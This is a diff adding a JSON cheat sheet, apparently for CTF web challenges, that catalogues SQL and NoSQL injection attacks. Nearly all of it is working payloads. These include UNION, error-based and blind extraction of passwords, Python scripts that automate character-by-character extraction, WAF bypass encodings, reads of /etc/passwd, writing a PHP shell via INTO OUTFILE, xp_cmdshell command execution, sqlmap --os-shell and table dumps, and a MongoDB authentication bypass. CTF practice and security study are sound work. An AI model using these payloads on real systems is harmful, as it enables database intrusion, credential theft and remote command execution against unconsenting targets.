@@ -1,0 +1,77 @@
+{
+  "title": "SQL Injection Techniques",
+  "category": "Web",
+  "description": "Comprehensive SQL injection attack vectors, bypass techniques, database-specific payloads, and exploitation strategies for CTF web challenges.",
+  "entries": [
+    {
+      "name": "Basic SQL Injection Detection",
+      "desc": "Identifying SQL injection vulnerabilities through input validation testing and error-based responses",
+      "example": "# Test payloads for detection\n'\n''\n`\n``\n,\n\"  \n\"\"\n/\n//\n\\\n\\\\\n;\n' OR '1\n' OR 1 -- -\n\" OR \"\" = \"\n\" OR 1 = 1 -- -\n' OR '' = '\nOR 1=1\n\n# Boolean-based detection\nid=1' AND '1'='1  # True condition (page loads)\nid=1' AND '1'='2  # False condition (error/different page)\n\n# Time-based detection\nid=1' AND SLEEP(5) -- -\nid=1'; WAITFOR DELAY '00:00:05' -- -\nid=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -",
+      "flag_hint": "Look for different responses: errors, blank pages, timing differences",
+      "tags": ["sqli", "detection", "boolean", "time-based"]
+    },
+    {
+      "name": "UNION-Based Injection",
+      "desc": "Extract data by combining results with UNION SELECT statements",
+      "example": "# Determine number of columns\n' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -  # Continues until error\n\n# Alternative: UNION SELECT NULL method\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -  # Until success\n\n# Find column with string data type\n' UNION SELECT 'a',NULL,NULL-- -\n' UNION SELECT NULL,'a',NULL-- -\n' UNION SELECT NULL,NULL,'a'-- -\n\n# Extract database information\n' UNION SELECT NULL,database(),NULL-- -\n' UNION SELECT NULL,user(),NULL-- -\n' UNION SELECT NULL,version(),NULL-- -\n\n# Extract table names\n' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -\n\n# Extract column names\n' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -\n\n# Extract data\n' UNION SELECT NULL,username,password FROM users-- -\n\n# Concatenate multiple columns\n' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users-- -",
+      "flag_hint": "UNION requires same number of columns and compatible data types",
+      "tags": ["sqli", "union", "data-extraction"]
+    },
+    {
+      "name": "Blind SQL Injection (Boolean)",
+      "desc": "Extract data bit-by-bit when no direct output is visible, using true/false conditions",
+      "example": "# Test if database name starts with 'a'\n' AND SUBSTRING(database(),1,1)='a'-- -\n\n# Binary search for character\n' AND ASCII(SUBSTRING(database(),1,1))>109-- -  # Test if > 'm'\n' AND ASCII(SUBSTRING(database(),1,1))>115-- -  # Test if > 's'\n\n# Extract data character by character\nimport requests\nimport string\n\ndef blind_sqli(url, param):\n    result = ''\n    for pos in range(1, 50):\n        for char in string.printable:\n            payload = f\"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{char}'-- -\"\n            r = requests.get(url, params={param: payload})\n            if 'Welcome' in r.text:  # Success indicator\n                result += char\n                print(f\"Found: {result}\")\n                break\n        else:\n            break  # No more characters\n    return result\n\n# Extract with LENGTH check\n' AND LENGTH(database())>5-- -\n' AND LENGTH((SELECT password FROM users LIMIT 1))=32-- -",
+      "flag_hint": "Boolean blind SQLi is slow but reliable - automate with sqlmap or script",
+      "tags": ["sqli", "blind", "boolean", "substring"]
+    },
+    {
+      "name": "Time-Based Blind Injection",
+      "desc": "Use time delays to infer true/false conditions when no visual feedback exists",
+      "example": "# MySQL time-based payloads\n' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -\n\n# PostgreSQL\n' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -\n\n# Microsoft SQL Server\n'; IF (1=1) WAITFOR DELAY '00:00:05'-- -\n'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '00:00:05'-- -\n\n# Oracle\n' AND CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END-- -\n\n# Python automation\nimport requests\nimport time\nimport string\n\ndef time_based_sqli(url, param):\n    result = ''\n    for pos in range(1, 50):\n        for char in string.printable:\n            payload = f\"' AND IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(3),0)-- -\"\n            start = time.time()\n            r = requests.get(url, params={param: payload})\n            elapsed = time.time() - start\n            \n            if elapsed >= 3:  # Detected sleep\n                result += char\n                print(f\"Found: {result}\")\n                break\n    return result",
+      "flag_hint": "Time-based is slower but works when no other feedback available",
+      "tags": ["sqli", "time-based", "blind", "sleep"]
+    },
+    {
+      "name": "Filter Bypass Techniques",
+      "desc": "Evading WAFs, filters, and blacklists using encoding and alternative syntax",
+      "example": "# Case variation\n' Or '1'='1\n' oR '1'='1\n' UnIoN SeLeCt\n\n# Comment variations\n' OR '1'='1'--\n' OR '1'='1'#\n' OR '1'='1'/* */\n' OR '1'='1';%00\n\n# Space bypass\n' OR/**/1=1-- -\n' OR%091=1-- -  # Tab\n' OR%0a1=1-- -  # Newline\n' OR+1=1-- -\n'/**/OR/**/1=1-- -\n\n# Keyword bypass\n' UnI0N SeLeCt  # Replace O with 0\n' /*!50000UNION*/ SELECT\n' %55nion %53elect  # URL encoding\n' uni<>on sel<>ect  # Removed by filter\n' UNunionION SEselectLECT  # Double word\n\n# AND/OR bypass\n' || '1'='1  # OR alternative\n' && '1'='1  # AND alternative\n' | 1  # Bitwise OR\n' & 1  # Bitwise AND\n\n# Equals bypass\n' OR 1 LIKE 1-- -\n' OR 'a' REGEXP 'a'-- -\n' OR 1 IN (1)-- -\n\n# Quote bypass\n' OR 1=1 LIMIT 1 OFFSET 0-- -  # No quotes needed\n' OR username LIKE CHAR(97,100,109,105,110)-- -  # 'admin' in ASCII\n\n# Encoding\n' OR 0x61646d696e=username-- -  # Hex encoding\n' UNION SELECT CHAR(65,66,67)-- -",
+      "flag_hint": "Try multiple bypass techniques - WAFs often miss edge cases",
+      "tags": ["sqli", "bypass", "waf", "filter-evasion"]
+    },
+    {
+      "name": "Database-Specific Payloads",
+      "desc": "Syntax and functions specific to different database systems",
+      "example": "# MySQL\n' UNION SELECT NULL,@@version,NULL-- -\n' UNION SELECT NULL,user(),database()-- -\n' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables-- -\n' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -\n' INTO OUTFILE '/var/www/shell.php'\n\n# PostgreSQL  \n' UNION SELECT NULL,version(),NULL-- -\n' UNION SELECT NULL,current_database(),current_user-- -\n' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables-- -\n'; COPY users TO '/tmp/output.txt'-- -\n\n# Microsoft SQL Server\n' UNION SELECT NULL,@@version,NULL-- -\n' UNION SELECT NULL,DB_NAME(),SYSTEM_USER-- -\n'; EXEC xp_cmdshell 'whoami'-- -\n' UNION SELECT NULL,name,NULL FROM sys.databases-- -\n\n# Oracle\n' UNION SELECT NULL,banner,NULL FROM v$version-- -\n' UNION SELECT NULL,user,NULL FROM dual-- -\n' UNION SELECT NULL,table_name,NULL FROM all_tables-- -\n\n# SQLite\n' UNION SELECT NULL,sqlite_version(),NULL-- -\n' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'-- -\n' UNION SELECT NULL,GROUP_CONCAT(name),NULL FROM sqlite_master-- -",
+      "flag_hint": "Identify database first using version() or error messages",
+      "tags": ["sqli", "mysql", "postgresql", "mssql", "oracle"]
+    },
+    {
+      "name": "Error-Based Injection",
+      "desc": "Force database errors that reveal data in error messages",
+      "example": "# MySQL error-based\n' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -\n\n# ExtractValue error\n' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- -\n\n# UpdateXML error\n' AND updatexml(null,concat(0x7e,(SELECT version()),0x7e),null)-- -\n\n# PostgreSQL error-based\n' AND 1=CAST((SELECT version()) AS int)-- -\n' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -\n\n# MSSQL error-based\n' AND 1=CONVERT(int,(SELECT @@version))-- -\n' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))-- -\n\n# Extract data in chunks (32 char limit)\n' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users),1,32)))-- -\n' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT password FROM users),33,32)))-- -",
+      "flag_hint": "Error messages often truncated - extract data in multiple queries",
+      "tags": ["sqli", "error-based", "extractvalue", "updatexml"]
+    },
+    {
+      "name": "Second-Order SQL Injection",
+      "desc": "Payload is stored in database, then executed when retrieved and used in another query",
+      "example": "# Scenario: User registration stores malicious username\n# Later, when admin views user profile, payload executes\n\n# Register with malicious username\nusername: admin'-- -\nemail: attacker@evil.com\n\n# When admin queries: SELECT * FROM users WHERE username='admin'-- -'\n# Comment truncates query, returns admin data\n\n# More complex payload\nusername: ' UNION SELECT 1,2,3-- -\n\n# When data is used in another query without sanitization:\nSELECT * FROM logs WHERE username='%s' % get_user_name(user_id)\n# Becomes: SELECT * FROM logs WHERE username='' UNION SELECT password FROM admin-- -'\n\n# Persistent XSS + SQLi combo\nusername: <script>alert(1)</script>' OR '1'='1\n\n# Exploitation steps:\n# 1. Inject payload in input field (registration, comment, etc.)\n# 2. Payload stored in database\n# 3. Wait for payload to be retrieved\n# 4. Payload executes in different context with higher privileges",
+      "flag_hint": "Test stored fields that might be used in queries elsewhere",
+      "tags": ["sqli", "second-order", "stored", "privilege-escalation"]
+    },
+    {
+      "name": "SQLMap Automation",
+      "desc": "Powerful automated SQL injection tool for detection and exploitation",
+      "example": "# Basic scan\nsqlmap -u \"http://target.com/page?id=1\"\n\n# POST request\nsqlmap -u \"http://target.com/login\" --data=\"user=admin&pass=test\"\n\n# With cookies\nsqlmap -u \"http://target.com/page?id=1\" --cookie=\"PHPSESSID=abc123\"\n\n# Specific parameter\nsqlmap -u \"http://target.com/page?id=1&cat=2\" -p id\n\n# Enumerate databases\nsqlmap -u \"http://target.com/page?id=1\" --dbs\n\n# Enumerate tables\nsqlmap -u \"http://target.com/page?id=1\" -D database_name --tables\n\n# Dump table\nsqlmap -u \"http://target.com/page?id=1\" -D database_name -T users --dump\n\n# Technique specification\nsqlmap -u \"http://target.com/page?id=1\" --technique=BEUST\n# B: Boolean-based blind\n# E: Error-based\n# U: UNION query-based\n# S: Stacked queries\n# T: Time-based blind\n\n# OS shell\nsqlmap -u \"http://target.com/page?id=1\" --os-shell\n\n# WAF bypass\nsqlmap -u \"http://target.com/page?id=1\" --tamper=space2comment\n\n# Batch mode (no prompts)\nsqlmap -u \"http://target.com/page?id=1\" --batch --level=5 --risk=3",
+      "flag_hint": "Use --batch for automation, --level and --risk for thorough testing",
+      "tags": ["sqli", "sqlmap", "automation", "tools"]
+    },
+    {
+      "name": "NoSQL Injection",
+      "desc": "Injection attacks against NoSQL databases like MongoDB, CouchDB",
+      "example": "# MongoDB authentication bypass\n# Normal: {\"username\": \"admin\", \"password\": \"secret\"}\n# Inject: {\"username\": \"admin\", \"password\": {\"$ne\": null}}\n# Bypasses: where password != null (always true)\n\n# URL parameters\nusername=admin&password[$ne]=\nusername[$ne]=&password[$ne]=\n\n# JSON payload\n{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}\n{\"username\": \"admin\", \"password\": {\"$regex\": \".*\"}}\n\n# Extract password character by character\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^a.*\"}}\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^ad.*\"}}\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^adm.*\"}}\n\n# JavaScript injection (if eval used)\nusername=admin&password=1'; return true; var dummy='&login=login\n\n# Operator injection\n$where: '1==1'\n$where: 'sleep(5000)'\n\n# Python exploitation\nimport requests\nimport string\n\npassword = ''\nwhile True:\n    for c in string.printable:\n        payload = {\"username\": \"admin\", \"password\": {\"$regex\": f\"^{password}{c}\"}}\n        r = requests.post(url, json=payload)\n        if 'Welcome' in r.text:\n            password += c\n            print(f\"Password: {password}\")\n            break\n    else:\n        break",
+      "flag_hint": "NoSQL injection uses operators like $ne, $gt, $regex instead of SQL syntax",
+      "tags": ["nosql", "mongodb", "injection", "bypass"]
+    }
+  ]
+}
